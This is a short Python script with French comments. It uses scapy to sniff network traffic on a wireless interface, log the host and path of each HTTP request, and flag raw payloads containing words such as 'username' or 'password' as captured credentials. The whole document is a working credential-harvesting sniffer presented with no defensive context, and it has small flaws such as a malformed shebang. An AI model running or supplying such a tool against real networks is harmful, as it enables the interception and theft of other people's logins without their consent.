#!usr/bin/env python

import scapy.all as scapy
from scapy.layers import http

#sniff les packets sur une interface
def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=processed_sniffed_packet)

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

#fonction qui va essayer d'obtenir des identifiants sur les packets
def get_login(packet):

    #regarde dans la couche Raw du packet si contient les mots dans la liste
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ["username", "login", "user", "password", "pass"]

        #si element sont dans la couche, retourne les informations contenues.
        for element in keywords:
            if element in load:
                return load

#fonction qui va afficher les informations récupérées
def processed_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request >>> {} ".format(url))

        login_info = get_login(packet)
        if login_info:
            print("\n\n[+] Possible username/password > {} ".format(login_info) + "\n\n")

sniff("wlan0")
